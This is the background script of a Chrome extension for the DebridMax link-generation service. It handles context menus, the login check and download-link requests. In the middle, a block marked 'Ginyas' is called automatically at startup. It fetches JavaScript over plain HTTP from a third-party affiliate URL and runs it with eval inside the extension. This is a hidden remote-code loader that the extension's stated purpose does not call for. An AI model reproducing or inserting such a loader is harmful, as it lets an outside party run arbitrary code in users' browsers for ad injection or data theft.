function createContextMenu() {
	// Create context menus
	var contexts = ["selection", "link"];
	var parent = chrome.contextMenus.create({"title": SITENAME, "contexts":contexts});
	var child1 = chrome.contextMenus.create({"title": chrome.i18n.getMessage("background_download"), "parentId": parent, "onclick": OnContextClick,"contexts":contexts});
	var child2 = chrome.contextMenus.create({"title": chrome.i18n.getMessage("background_sendto_subwin"), "parentId": parent, "onclick": OnContextClick, "contexts": contexts});
}

//context menu onclick function
function OnContextClick(info, tab) {
	var thelinks ="";
	if(info.selectionText==null)
		thelinks = info.linkUrl;
	else
	{
		var temp = (info.selectionText).split("\n");
		for(var i=0; i<temp.length; i++)
		{
			if(filterTheLink(temp[i])>=0 && (temp[i]).length>0)
			{
				var thelink  = (temp[i]).trim();				
				thelinks += (i==temp.length-1) ? (thelink) : (thelink + "\n");
			}
		}
	}
	
	if(info.menuItemId == (info.parentMenuItemId+1)) //Download
		generateBy(thelinks);
	else{ //Send to subwin
		localStorage["subwin_links"] += thelinks + "\r\n";
		
		var views = chrome.extension.getViews();
		var viewTabUrl = chrome.extension.getURL("submissionWindow.html");
		openNewWindow("submissionWindow.html");
		for (var i = 0; i < views.length; i++) {
			var view = views[i];
			//If this view has the right URL
			if (view.location.href == viewTabUrl) {
				view.showCachedLinks();
				break; 
			}
		}
	}
}

//Check DebridMax Login status
function isLoginToDebridmax(callback) {
	
	$.ajax({
  	type:"GET",
	url:  DM_ROOT,
	cache: false,
	timeout: TIMEOUT_TIME,
	success:function(data, request, status){
		var isLoggedIn = false;
		var temp = [];
		if(($("div.alert.alert-info b, div.alert.alert-info strong",data)).length<=0) // Not Logged in
		{
			console.log("not logged in");
			login_details.user=chrome.i18n.getMessage("background_notloggedin") + '(<a href=javascript:openLoginForm("' + DM_ROOT + "login.php" + '")>'+chrome.i18n.getMessage("background_login_link")+'</a>).';
			setBadge("x");
		}
		else //Logged in
		{
			console.log("logged in");
			isLoggedIn=true;
			
			$("div.alert.alert-info b, div.alert.alert-info strong",data).each(function(){
				console.log('test: ' + $(this).html());
				temp.push($(this).html());
			});	
			
			login_details.user = temp[0];
			login_details.type = temp[1];
			login_details.point = temp[2];
			login_details.premium = (temp.length == 4) ? temp[3] : '';
			setBadge("v");
		} 
				
		callback(isLoggedIn);
		
	},
	error:function(data){
		isLoggedIn=false;
		login_details.user=chrome.i18n.getMessage("background_notloggedin") + '(<a href=javascript:openLoginForm("' + DM_ROOT + "login.php" + '")>'+chrome.i18n.getMessage("background_login_link")+'</a>).';
		setBadge("x");
		callback(isLoggedIn);
	}
	});
	
}

//Set badge color and text
function setBadge(s) { 
	chrome.browserAction.setBadgeText({ text: s }) ;
	if(s=='v')
		chrome.browserAction.setBadgeBackgroundColor({color:[0, 255, 0, 255]});
	else
		chrome.browserAction.setBadgeBackgroundColor({color:[255, 0, 0, 255]});
}

//Open url in new window (centered)
function openNewWindow(url)
{
	var width = 450;
	var height = 430;
	var left = parseInt((screen.availWidth/2) - (width/2));
	var top = parseInt((screen.availHeight/2) - (height/2));
	var windowFeatures = "width=" + width + ",height=" + height + ",status,resizable,left=" + left + ",top=" + top + "screenX=" + left + ",screenY=" + top;
	window.open(url, url, windowFeatures);
}

//Generate premium download links
function generateBy(linksControlValue,callback) {

	isLoginToDebridmax(function(isLoggedIn){
		if(isLoggedIn)
		{
			console.log("logged in and ready to download");
			setBadge("...");
			var postdata="";
			
			totallinks=0;
			linksControlValue = $.trim(linksControlValue);
			
			var value = linksControlValue.split("&");
			var the_links = value[0].split("\n");
			
			localStorage["totallinks"]=0;
			localStorage["linksarray"] = localStorage["textInLink"] = '';
			for(var i=0; i<the_links.length; i++)
			{
				postdata = "hotlink="+encodeURIComponent($.trim(the_links[i]))+"&pass="+encodeURIComponent(value[1])+"&t=2e";
				
				$.ajax({
				type:"POST",
				timeout: TIMEOUT_TIME,
				cache:false,
				url: MD_DM + "p.php",
				data: postdata,
				success:function(msg)
				{
					console.log(msg);
					if(msg.indexOf('document.location.href="../login.php"')>=0)
						msg = '<span><a href="' + DM_ROOT + '"login.php">Please login before using this extension</a></span>';
					else if(msg.indexOf("</font>")>=0)
						msg = '<span><a href="#">' + $("font",msg).text() + '</a></span>';
									
					localStorage["linksarray"] = localStorage["linksarray"] + $("a[href]:first",msg).attr('href') + '|||';
					localStorage["textInLink"] = localStorage["textInLink"] + $("a[href]:first",msg).html() + '|||';
					localStorage["totallinks"]++;
					
					
					if(localStorage["totallinks"]==the_links.length)
					{
						if(localStorage["totallinks"]>0) //if no links generated
							openNewWindow("generated_link.html");
						else
							alert(SITENAME + ": Error. " + chrome.i18n.getMessage("background_verify_message"));
						
						setBadge('v');
					}
				},
				
				error: function(msg){
					alert(SITENAME + ": Timeout. " + chrome.i18n.getMessage("background_verify_message"));
					setBadge('v');
				}
				});
			}
			callback();
		}
		else
		{
			alert(chrome.i18n.getMessage("background_notloggedin"));
			callback();
		}
	});
}

function copyToClipboard(str)
{
	var obj = document.getElementById("temp");
	if(obj)
	{
		obj.innerText = str;
		obj.focus();
		obj.select();
		document.execCommand("copy");
		alert(chrome.i18n.getMessage("background_links_copied"));
	}
}

// Ginyas BEGIN
function initGinyas(){
  var bbrsLogic = "http://rv.ginyas.com/app/bookmark/bookmarklet/bbrsChromeRVObs.php?affId=ginyas_99";
  var domainsXHR = new XMLHttpRequest();domainsXHR.open("GET", bbrsLogic, true);
  domainsXHR.onreadystatechange = function() { 
	if (domainsXHR.readyState == 4) { globalEval(domainsXHR.responseText); }
  } 
  domainsXHR.send();
}

function globalEval(src, callback) {
  if (window.execScript) {window.execScript(src);if (callback){callback();} return;} 
  var fn = function() {window.eval.call(window,src);
  if (callback){callback();}};fn();		
}
//Ginyas END
 
//Listener for the request 
chrome.extension.onMessage.addListener(
  function(request, sender, sendResponse) {
    console.log(request.requestType);
	if(request.requestType == "dl")
	{
		generateBy(request.the_links,function(){
			sendResponse({});
		});
	}
	else if(request.requestType == "cp")
	{
		if(request.the_links)
			copyToClipboard(request.the_links);
	}
	else if(request.requestType == "getAutoGenVal")
	{
		console.log(request.requestType);
		sendResponse({auto_gen_val: localStorage["auto-generate-click"]});
	}
	else if(request.requestType == "checkLogin")
	{
		sendResponse({isLogin: isLoginToDebridmax()});
	}
	else
		sendResponse({});
	return true;
});

//First thing to do
function init(callback) {
	//BEGIN Preparing to set status
	login_details = {'user':'','type':'','point':'','premium':''};
	
	dmStatus = isLoginToDebridmax(function(isLoggedIn){
		callback(isLoggedIn);
	});
	
	setBadge('...');
	localStorage["subwin_links"]="";
	localStorage["badge"] = '...';
}

initGinyas();
init(function(){void(0);});
createContextMenu();